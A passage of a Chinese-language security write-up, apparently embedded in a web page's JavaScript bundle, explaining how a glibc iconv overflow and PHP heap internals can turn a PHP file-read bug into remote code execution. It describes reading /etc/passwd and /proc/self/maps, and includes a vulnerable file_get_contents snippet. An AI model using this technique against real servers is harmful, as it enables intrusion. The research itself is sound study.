trigg\u250aer\u2022$*H\u2022N\u2502\n\u250200000020\u2502 4c 61 0f 3a 20 4e 6f 20 \u250a 73 75 63 68 20 66 69 6c \u2502La\u2022: No \u250asuch fil\u2502\n\u250200000030\u2502 65 20 6f 72 20 64 69 72 \u250a 65 63 74 6f 72 79 0a    \u2502e or dir\u250aectory_ \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u5185\u90e8\uff0c ",(0,s.jsx)(n.code,{children:"pkexec"})," \u4f7f\u7528 \u8f93\u51fa ",(0,s.jsx)(n.code,{children:"GLib"})," \u5176\u6d88\u606f\u3002\u5b83\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"#define NUL_TERMINATOR_LENGTH 4\n\noutbuf_size = len + NUL_TERMINATOR_LENGTH;\n\noutbytes_remaining = outbuf_size - NUL_TERMINATOR_LENGTH;\noutp = dest = g_malloc (outbuf_size);\n\n...\n\nerr = g_iconv (converter, NULL, &inbytes_remaining, &outp, &outbytes_remaining);\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u867d\u7136\u5b83\u5206\u914d\u4e86 N + 4 \u5b57\u8282\u7684\u7f13\u51b2\u533a\uff0c\u4f46\u5b83\u53ea\u544a\u8bc9 iconv \u5173\u4e8e N \u4e2a\u5b57\u8282\u3002\u6211\u4eec\u7684\u6ea2\u51fa\u6700\u591a\u6709 3 \u4e2a\u5b57\u8282\u957f\u3002\u56e0\u6b64\uff0c\u65e0\u8bba\u6211\u4eec\u591a\u4e48\u52aa\u529b\uff0c\u6211\u4eec\u90fd\u65e0\u6cd5\u5230\u8fbe\u7f13\u51b2\u533a\u4e4b\u5916\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u53e6\u4e00\u4e2a\u6b7b\u80e1\u540c\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u6761\u4ef6\u548c\u57fa\u5143\u5df2\u66f4\u65b0",children:"\u6761\u4ef6\u548c\u57fa\u5143\uff08\u5df2\u66f4\u65b0\uff09"}),"\n",(0,s.jsx)(n.p,{children:"\u6ee1\u6000\u5931\u671b\uff0c\u6211\u53ea\u80fd\u66f4\u65b0\u6211\u7684\u8981\u6c42\u6e05\u5355\u3002\u8981\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u63a7\u5236\u8f93\u51fa\u5b57\u7b26\u96c6 \uff08 ",(0,s.jsx)(n.code,{children:"ISO-2022-CN-EXT"})," \uff09"]}),"\n",(0,s.jsx)(n.li,{children:"\u8f93\u5165\u7f13\u51b2\u5668\u7684\u63a7\u5236\u90e8\u5206"}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"\u5177\u6709\u5408\u9002\u7684\u8f93\u51fa\u7f13\u51b2\u5668"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"\u5229\u7528php\u8fc7\u6ee4\u5668",children:"\u5229\u7528PHP\u8fc7\u6ee4\u5668"}),"\n",(0,s.jsxs)(n.p,{children:["\u5373\u4f7f\u627e\u4e86\u51e0\u5929\uff0c\u6211\u4e5f\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u6709\u6548\u7684\u76ee\u6807\u3002\u76f2\u76ee\u5730\u5728\u5e93\u548c\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u5bfb\u627e ",(0,s.jsx)(n.code,{children:"iconv()"})," \u8c03\u7528\uff0c\u6d4f\u89c8\u5f00\u6e90\u751f\u6001\u7cfb\u7edf\uff0c\u5bfb\u627e\u8be5\u9519\u8bef\u7684\u53ef\u89e6\u53d1\u5b9e\u4f8b\uff0c\u6211\u62fc\u547d\u5bfb\u627e\u5d29\u6e83\u3002\u4e00\u3002\u5d29\u6e83\u3002\u65e0\u6d4e\u4e8e\u4e8b\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u4e3a\u4e86\u91cd\u65b0\u71c3\u8d77\u5e0c\u671b\uff0c\u6211\u53c8\u56de\u5230\u4e86PHP\uff1a\u6bd5\u7adf\uff0c\u5b83\u786e\u5b9e\u5d29\u6e83\u4e86\uff0c\u6211\u751a\u81f3\u6ca1\u6709\u8981\u6c42\u5b83\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u76ee\u6807\u5f88\u7b80\u5355\uff1a\u5c06\u65e0\u804a\u7684\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u8f6c\u6362\u4e3a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"php\u5806\u7684\u5165\u95e8",children:"PHP\u5806\u7684\u5165\u95e8"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.em,{children:"\u6ce8\u610f\uff1a\u5728\u672c\u8282\u4e2d\uff0c\u4ee5\u53ca\u5728\u63cf\u8ff0PHP\u5185\u90e8\u7ed3\u6784\u7684\u6bcf\u4e2a\u90e8\u5206\u4e2d\uff0c\u6211\u5c06\u8fdb\u884c\u8fd1\u4f3c\u503c\u5e76\u5ffd\u7565\u67d0\u4e9b\u5185\u5bb9\u3002"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e2a\u76ee\u7684\uff0c\u6211\u4eec\u9700\u8981\u4e86\u89e3PHP\u5806\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff08\u81f3\u5c11\u662f\u5176\u4e2d\u7684\u4e00\u90e8\u5206\uff09\u3002\u522b\u62c5\u5fc3\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u5806\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u8981\u4f7f\u7528 PHP \u8fdb\u884c\u5206\u914d\uff0c\u8bf7\u4f7f\u7528 \uff0c\u5c06 \u4e0e N \u4e00\u8d77\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"emalloc(N)"})," \u6240\u9700\u7684\u5b57\u8282\u6570\u3002\u60a8\u5c06\u8fd4\u56de\u6307\u5411\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a8 N \u4e2a\u5b57\u8282\u7684\u5757\uff08\u5185\u5b58\u5757\uff09\u7684\u6307\u9488\u3002\u5b8c\u6210\u5757\u540e\uff0c\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"efree(ptr)"})," .PHP \u6709\u5404\u79cd\u5927\u5c0f\u7684\u5757\uff088\u30010x10\u30010x18\u3001...0x200,0x280\uff0c......"]}),"\n",(0,s.jsx)(n.p,{children:"PHP \u5806\u7531\u4e00\u4e2a 2MB \u7684\u533a\u57df\u7ec4\u6210\uff0c\u5206\u4e3a 512 \u9875\uff0c\u6bcf\u9875 0x1000 \u5b57\u8282\u3002\u6bcf\u4e2a\u9875\u9762\u53ef\u80fd\u5305\u542b\u7279\u5b9a\u5927\u5c0f\u7684\u5757\u3002\u4f8b\u5982\uff0c\u7b2c 10 \u9875\u53ef\u80fd\u5305\u542b\u5927\u5c0f\u4e3a 0x100 \u7684\u5757\u3001\u7b2c 11 \u9875\u5927\u5c0f\u4e3a 0x38 \u7684\u5757\u3001\u7b2c 12 \u9875\u5927\u5c0f\u4e3a 0x180 \u7684\u5757\u7b49\u3002\u5757\u4e4b\u95f4\u6ca1\u6709\u5143\u6570\u636e\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5f53\u60a8\u91ca\u653e\u4e00\u4e2a\u5757\u65f6\uff0c\u5b83\u4f1a\u88ab\u653e\u5728\u4e00\u4e2a\u79f0\u4e3a\u91ca\u653e\u5217\u8868\u7684\u5355\u5411\u94fe\u8868\u7684\u5f00\u5934\u3002\u6bcf\u4e2a\u5757\u5927\u5c0f\u90fd\u6709\u4e00\u4e2a\u514d\u8d39\u5217\u8868\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u8981\u91ca\u653e\u5927\u5c0f\u4e3a 0x38 \u5757\uff0c\u5b83\u5c06\u8fdb\u5165\u5927\u5c0f\u4e3a 0x38 \u5757\u7684\u53ef\u7528\u5217\u8868\u4e2d\u3002\u5982\u679c\u6211\u91ca\u653e\u4e86\u4e00\u5927\u5757\u5927\u5c0f0x200\uff0c\u5b83\u5c31\u4f1a\u8fdb\u5165\u5927\u57570x200\u7684\u514d\u8d39\u5217\u8868\u4e2d......"}),"\n",(0,s.jsx)(n.p,{children:"\u4e3a\u4e86\u5206\u914d N \u4e2a\u5b57\u8282\uff0cPHP \u4f1a\u67e5\u770b\u53ef\u7528\u5217\u8868\u4e2d\u7684\u76f8\u5e94\u5757\u5927\u5c0f\uff0c\u53d6\u51fa\u78c1\u5934\u5e76\u8fd4\u56de\u5b83\u3002\u5982\u679c\u53ef\u7528\u5217\u8868\u4e3a\u7a7a\uff08\u5373\u6240\u6709\u53ef\u7528\u7684\u5757\u90fd\u5df2\u5206\u914d\uff09\uff0cPHP \u4f1a\u67e5\u770b\u5806\u5143\u6570\u636e\u4ee5\u67e5\u627e\u672a\u4f7f\u7528\u7684\u9875\u9762\u3002\u7136\u540e\uff0c\u5b83\u4f1a\u5728\u8fd9\u6837\u7684\u9875\u9762\u4e2d\u521b\u5efa\u7a7a\u5757\uff0c\u5e76\u5c06\u5b83\u4eec\u653e\u5728\u7a7a\u95f2\u5217\u8868\u4e2d\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u514d\u8d39\u5217\u8868\u662f\u540e\u8fdb\u5148\u51fa\uff0c\u8fd9\u610f\u5473\u7740\u5f53\u6211\u91ca\u653e\u4e00\u5b9a\u5927\u5c0f\u7684\u5757\u65f6\uff0c\u5b83\u5c06\u6210\u4e3a\u514d\u8d39\u5217\u8868\u7684\u5934\u90e8\u3002\u5f53\u6211\u5206\u914d\u65f6\uff0c\u5934\u90e8\u88ab\u53d6\u51fa\u3002\u8fd9\u4e0e glibc \u7684 tcache \u975e\u5e38\u76f8\u4f3c\uff0c\u4f46\u4e0d\u53d7\u9650\u5236\u3002"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112562.png-.png",alt:"img"}),(0,s.jsx)(n.em,{children:"PHP \u5806\u7684\u53ef\u89c6\u5316\u8868\u793a"})]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5728\u5de6\u4fa7\u6709\u4e00\u4e2a\u5806\u7684\u53ef\u89c6\u5316\u8868\u793a\u3002\u5b83\u5305\u542b 512 \u9875\uff0c\u6b64\u5904\u7b2c 5 \u9875\u5b58\u50a8\u4e86\u5927\u5c0f\u4e3a 0x400 \u7684\u5757\u3002\u5982\u679c\u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u4e2a\u9875\u9762\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83\u5305\u542b 4 \u4e2a\u5757\uff08\u56e0\u4e3a 4 \xd7 0x400 = 0x1000\uff0c\u4e00\u4e2a\u9875\u9762\u7684\u5927\u5c0f\uff09\u3002\u5728\u8fd9\u91cc\uff0c\u5206\u914d\u4e86\u5757 #1 \u548c #3\uff0c\u5e76\u91ca\u653e\u4e86\u5757 #2 \u548c #4\u3002\u56e0\u6b64\uff0c\u5b83\u4eec\u5728\u5927\u5c0f\u4e3a 0x400 \u5757\u7684\u514d\u8d39\u5217\u8868\u4e2d\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u7a7a\u95f2\u5217\u8868\u662f\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u6bcf\u4e2a\u672a\u5206\u914d\u7684\u5757\u90fd\u5305\u542b\u6307\u5411\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5757\u7684\u6307\u9488\u4f5c\u4e3a\u5176\u524d 8 \u4e2a\u5b57\u8282\u3002\u8fd9\u5c31\u662f\u6211\u4eec\u5728\u5757 #2 \u4e2d\u770b\u5230\u7684\uff1a\u6307\u5411 0x7ff10201400 \u7684\u6307\u9488\uff0c\u8fd9\u662f\u5927\u5c0f\u4e3a 0x400 \u7684\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5757\u7684\u5730\u5740\u3002\u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8981\u4ece\u5757 #1 \u6ea2\u51fa\u5230\u5757 #2\uff0c\u6211\u4eec\u5c06\u8986\u76d6\u6b64\u6307\u9488\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6f0f\u6d1e\u5229\u7528\u8d77\u70b9\uff1a\u5373\u4f7f\u6709\u4e00\u4e2a\u5b57\u8282\u7684\u6ea2\u51fa\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6539\u4e00\u4e2a\u7a7a\u95f2\u5217\u8868\u6307\u9488\uff0c\u4ece\u800c\u6539\u53d8\u7a7a\u95f2\u5217\u8868\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0cPHP\u4e3a\u6bcf\u4e2aHTTP\u8bf7\u6c42\u521b\u5efa\u4e00\u4e2a\u65b0\u5806\u3002\u8fd9\u662f\u4f7f\u8fdc\u7a0b PHP \u5f00\u53d1\u53d8\u5f97\u56f0\u96be\u7684\u539f\u56e0\u4e4b\u4e00\u2014\u2014\u4f46\u8fd9\u5c06\u5728\u7b2c 2 \u90e8\u5206\u4e2d\u4ecb\u7ecd\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"php-\u8fc7\u6ee4\u5668\u5185\u90e8",children:"PHP \u8fc7\u6ee4\u5668\u5185\u90e8"}),"\n",(0,s.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86 PHP \u662f\u5982\u4f55\u5206\u914d\u548c\u53d6\u6d88\u5206\u914d\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u770b PHP \u5982\u4f55\u5904\u7406 ",(0,s.jsx)(n.code,{children:"php://filter/"})," \u5b57\u7b26\u4e32\u3002\u6211\u4eec\u5f88\u5e78\u8fd0\uff1a\u6211\u4eec\u4e0d\u9700\u8981\u6df1\u5165\u4e86\u89e3\u5185\u90e8 PHP \u7ed3\u6784\u7684\u7ec6\u8282\uff0c\u4f8b\u5982 ",(0,s.jsx)(n.code,{children:"zval"})," \u3001 ",(0,s.jsx)(n.code,{children:"zend_string"})," \u3001 ",(0,s.jsx)(n.code,{children:"zend_array"})," \u7b49\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3a\u4e86\u5904\u7406\u8fc7\u6ee4\u5668\uff0cPHP \u5c06\u9996\u5148\u83b7\u53d6\u6d41\uff08\u5373\u8bfb\u53d6\u8d44\u6e90\uff09\u3002\u5b83\u5c06\u6d41\u5b58\u50a8\u5728\u5b58\u50a8\u6876\u7684\u96c6\u5408\u4e2d\uff0c\u8fd9\u4e9b\u5b58\u50a8\u6876\u662f\u53cc\u94fe\u63a5\u7ed3\u6784\uff0c\u6bcf\u4e2a\u5b58\u50a8\u6876\u90fd\u5305\u542b\u4e00\u5b9a\u5927\u5c0f\u7684\u7f13\u51b2\u533a\u3002\u6309\u7167\u6211\u4eec\u7684 ",(0,s.jsx)(n.code,{children:"/etc/passwd"})," \u793a\u4f8b\uff0c\u6211\u4eec\u53ef\u80fd\u6709 3 \u4e2a\u5b58\u50a8\u6876\uff1a\u7b2c\u4e00\u4e2a\u5b58\u50a8\u6876\u53ef\u80fd\u5305\u542b\u6587\u4ef6\u7684\u524d 5 \u4e2a\u5b57\u8282\uff0c\u7b2c\u4e8c\u4e2a\u5b58\u50a8\u6876\u5305\u542b 30 \u591a\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e09\u4e2a\u5b58\u50a8\u6876\u5305\u542b 1000 \u4e2a\u5b57\u8282\u3002\u5b83\u4eec\u8054\u7cfb\u5728\u4e00\u8d77\uff0c\u6784\u6210\u4e86\u4e00\u4e2a\u6c34\u6876\u65c5\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112563.png-.png",alt:"img"}),(0,s.jsxs)(n.em,{children:["\u4e00\u4e2a\u7531 3 \u4e2a\u94f2\u6597\u7ec4\u6210\u7684\u94f2\u6597\u5927\u961f\uff0c\u5176\u4e2d\u5305\u542b ",(0,s.jsx)(n.code,{children:"/etc/passwd"})]})]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u662f\u5c06\u6d41\u8868\u793a\u4e3a\u5404\u79cd\u5927\u5c0f\u7684\u7f13\u51b2\u533a\u96c6\u5408\u7684\u6807\u51c6\u65b9\u6cd5\u3002\u60a8\u53ef\u4ee5\u5c06\u5176\u60f3\u8c61\u4e3a\u901a\u8fc7\u7f51\u7edc\u63a5\u6536\u7684\u6570\u636e\u5305\u5217\u8868\u3002\u6570\u636e\u5305 1 \u5305\u542b\u524d N \u4e2a\u5b57\u8282\u7684\u6570\u636e\uff0c\u6570\u636e\u5305 2 \u5305\u542b\u63a5\u4e0b\u6765\u7684 M \u4e2a\u5b57\u8282\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u73b0\u5728\uff0cPHP \u5df2\u7ecf\u5c06\u8d44\u6e90\u7684\u5185\u5bb9\u8bfb\u5165\u6d41\u4e2d\uff0c\u7531\u5b58\u50a8\u6876\u65c5\u8868\u793a\uff0c\u5b83\u53ef\u4ee5\u5bf9\u5176\u5e94\u7528\u8fc7\u6ee4\u5668\u3002\u5b83\u91c7\u7528\u7b2c\u4e00\u4e2a\u7b5b\u9009\u5668\uff0c\u5e76\u5904\u7406\u7b2c\u4e00\u4e2a\u5b58\u50a8\u6876\u3002\u4e3a\u6b64\uff0c\u5b83\u4f1a\u5206\u914d\u4e00\u4e2a\u4e0e\u5b58\u50a8\u6876\u7f13\u51b2\u533a\u5927\u5c0f\u76f8\u540c\u7684\u8f93\u51fa\u7f13\u51b2\u533a\uff08\u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\u4e3a 5 \u4e2a\u5b57\u8282\uff09\uff0c\u5e76\u8fdb\u884c\u8f6c\u6362\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7b5b\u9009\u5668\u662f ",(0,s.jsx)(n.code,{children:"string.upper"})," \uff0c\u5b83\u4f1a\u5c06\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u6bcf\u4e2a\u5c0f\u5199\u5b57\u7b26\u8f6c\u6362\u4e3a\u8f93\u51fa\u7f13\u51b2\u533a\u4e2d\u7684\u5927\u5199\u5b57\u7b26\u3002\u7136\u540e\uff0c\u5b83\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u6b64\u7f13\u51b2\u533a\u7684\u65b0\u5b58\u50a8\u6876\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112564.png-.png",alt:"img"}),(0,s.jsxs)(n.em,{children:["\u7533\u8bf7 ",(0,s.jsx)(n.code,{children:"string.upper"})," \u6c34\u6876\u5927\u961f"]})]}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\uff0c\u5b83\u5904\u7406\u5b58\u50a8\u6876 2\uff0c\u7136\u540e\u5904\u7406\u5b58\u50a8\u6876 3\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff0c\u76f4\u5230\u5230\u8fbe\u6700\u540e\u4e00\u4e2a\u5b58\u50a8\u6876\u3002\u73b0\u5728\uff0c\u5b83\u6709\u4e00\u4e2a\u5305\u542b\u6bcf\u4e2a\u8f93\u51fa\u6876\u7684\u65b0\u94f2\u6597\u65c5\u3002\u5b83\u73b0\u5728\u53ef\u4ee5\u5c06\u7b2c\u4e8c\u4e2a\u8fc7\u6ee4\u5668\u5e94\u7528\u5230\u8fd9\u4e2a\u65c5\u4e0a\uff0c\u5e76\u7ee7\u7eed\u524d\u8fdb\uff0c\u76f4\u5230\u5904\u7406\u5b8c\u6700\u540e\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"\u60c5\u51b5\u548c\u76ee\u6807",children:"\u60c5\u51b5\u548c\u76ee\u6807"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u5df2\u7ecf\u5b8c\u6210\u4e86\u5b9a\u4e49\u3002\u8ba9\u6211\u4eec\u56de\u5230\u6211\u4eec\u6700\u521d\u7684\u6f0f\u6d1e\uff1a\u6587\u4ef6\u8bfb\u53d6\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"echo file_get_contents($_GET['file']);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"convert.iconv.XXX.ISO-2022-CN-EXT"})," \u8fc7\u6ee4\u5668\u89e6\u53d1\u5185\u5b58\u635f\u574f\uff0c\u6211\u4eec\u9700\u8981\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002\u800c\u4e14\u5b83\u770b\u8d77\u6765\u5e76\u4e0d\u96be\u5229\u7528\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u6709\u4e00\u4e2a\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08PHP\u3001Apache \u7b49\uff09\u3002\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u4e0b\u8f7dlibc\u5e76\u68c0\u67e5\u5b83\u662f\u5426\u5df2\u4fee\u8865\uff01\u6211\u4eec\u4e5f\u4e0d\u5173\u5fc3 ASLR \u548c PIE\uff1a\u6211\u4eec\u53ef\u4ee5\u9605\u8bfb ",(0,s.jsx)(n.code,{children:"/proc/self/maps"})," .\u6700\u540e\uff0c\u611f\u89c9\u6211\u4eec\u51e0\u4e4e\u53ef\u4ee5\u4f7f\u7528\u5b58\u50a8\u6876\u4efb\u610f\u5206\u914d\u6216\u89e3\u9664\u5206\u914d\u7f13\u51b2\u533a\uff0c\u8fd9\u5f88\u65b9\u4fbf\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u53e6\u4e00\u65b9\u9762\uff0c\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u4f60\u53ef\u4ee5\u8ba9\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\uff1a\u4f60\u53ef\u80fd\u5728\u8fd0\u884c\u5728 PHP 7.0 \u4e0a\u7684 Symfony 4.x \u4e0a\uff0c\u6216\u8005\u5728 PHP 8.3 \u4e0a\u8fd0\u884c\u7684\u6666\u6da9\u7684 Wordpress \u63d2\u4ef6\u4e2d\uff0c\u751a\u81f3\u5728\u9ed1\u76d2\u8bc4\u4f30\u671f\u95f4\u3002\u7406\u60f3\u7684\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u5177\u6709\u5f39\u6027\uff1a\u5b83\u5fc5\u987b\u9488\u5bf9\u5927\u591a\u6570\u76ee\u6807\uff0c\u65e0\u9700\u4efb\u4f55\u8c03\u6574\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"\u5f00\u53d1",children:"\u5f00\u53d1"}),"\n",(0,s.jsx)(n.p,{children:"\u8003\u8651\u5230\u6240\u6709\u8fd9\u4e9b\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u5f00\u53d1\u3002\u8fd9\u4e2a\u60f3\u6cd5\u662f\u4f7f\u7528\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u4fee\u6539\u6307\u5411\u53ef\u7528\u5757\u7684\u6307\u9488\u7684 LSB\uff0c\u4ee5\u4fbf\u63a7\u5236\u4e00\u4e9b\u53ef\u7528\u5217\u8868\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u5355\u6876",children:"\u5355\u6876"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u9762\u4e34\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u5c3d\u7ba1\u6709 bucket brigade \u6280\u672f\uff0c\u4f46 PHP \u53ea\u521b\u5efa\u4e00\u4e2a bucket\u3002\u5982\u679c\u60a8\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\uff0c\u60a8\u5c06\u83b7\u5f97\u4e00\u4e2a\u5305\u542b\u6574\u4e2a\u6587\u4ef6\u7684\u5b58\u50a8\u6876\u3002\u5982\u679c\u60a8\u8bf7\u6c42 HTTP URL\uff0cPHP \u5c06\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6574\u4e2a HTTP \u54cd\u5e94\u7684\u5b58\u50a8\u6876\u3002\u548c ",(0,s.jsx)(n.code,{children:"ftp://"})," \uff0c\u4e00\u4e2a\u6876\u3002\u81f3\u5c11\u53ef\u4ee5\u8bf4\uff0c\u8fd9\u662f\u975e\u5e38\u4e0d\u5207\u5b9e\u9645\u7684\uff1a\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u6c34\u6876\u6765\u586b\u5145\u5806\uff0c\u55b7\u6d12\u4e1c\u897f\uff0c\u751a\u81f3\u4f7f\u7528\u66f4\u6539\u540e\u7684\u514d\u8d39\u5217\u8868\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u60f3\u4e00\u60f3\uff1a\u4f7f\u7528\u5355\u4e2a\u5b58\u50a8\u6876\uff0c\u6211\u4eec\u53ef\u4ee5\u6ea2\u51fa\u5230\u4e00\u4e2a\u7a7a\u95f2\u533a\u5757\u4e2d\u5e76\u4fee\u6539\u4e00\u4e2a\u7a7a\u95f2\u5217\u8868\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u6709\u4e86\u5b58\u50a8\u6876\uff0c\u6211\u4eec\u81f3\u5c11\u9700\u8981 2 \u4e2a\u5206\u914d\u624d\u80fd\u4f7f\u7528\u6211\u4eec\u66f4\u6539\u7684\u7a7a\u95f2\u5217\u8868\uff01"}),"\n",(0,s.jsxs)(n.p,{children:["\u5e78\u8fd0\u7684\u662f\uff0c\u6709\u4e00\u79cd\u8fc7\u6ee4\u5668\u53ef\u4ee5\u633d\u6551\u8fd9\u4e00\u5929\uff1a ",(0,s.jsx)(n.code,{children:"zlib.inflate"})," .\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4f1a\u83b7\u53d6\u6211\u4eec\u7684\u6d41\u5e76\u5bf9\u5176\u8fdb\u884c\u89e3\u538b\u7f29\u3002\u4e3a\u6b64\uff0c\u5b83\u5206\u914d\u4e86\u4e00\u4e2a 8 \u9875\uff080x8000 \u5b57\u8282\uff09\u7684\u7f13\u51b2\u533a\uff0c\u5e76\u5c06\u6211\u4eec\u7684\u6d41\u81a8\u80c0\u5230\u5176\u4e2d\u3002\u5982\u679c\u5b83\u4e0d\u591f\u5927\uff0c\u5b83\u4f1a\u521b\u5efa\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684\u65b0\u7f13\u51b2\u533a\u6765\u5b58\u50a8\u5176\u4f59\u6570\u636e\u3002\u5982\u679c\u8fd9\u4e24\u8005\u4ecd\u7136\u4e0d\u591f\uff0c\u5b83\u4f1a\u521b\u5efa\u53e6\u4e00\u4e2a\u7f13\u51b2\u533a\u3002\u7136\u540e\u5c06\u6bcf\u4e2a\u7f13\u51b2\u533a\u6dfb\u52a0\u5230\u5b58\u50a8\u6876\u4e2d\u3002\u5b8c\u7f8e\uff1a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u6765\u521b\u5efa\u4efb\u610f\u6570\u91cf\u7684\u5b58\u50a8\u6876\uff0c\u8fd9\u662f\u5411\u524d\u8fc8\u51fa\u7684\u4e00\u5927\u6b65\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112565.png-.png",alt:"img"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsxs)(n.em,{children:["\u7533\u8bf7 ",(0,s.jsx)(n.code,{children:"zlib.inflate"})," \u521b\u5efa\u591a\u4e2a\u5b58\u50a8\u6876"]})}),"\n",(0,s.jsx)(n.p,{children:"\u4f46\u662f\uff0c\u8fd9\u4e9b\u5b58\u50a8\u6876\u5177\u6709\u5927\u5c0f\u4e3a 0x8000 \u7684\u7f13\u51b2\u533a\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5229\u7528\u5927\u5c0f;\u7f13\u51b2 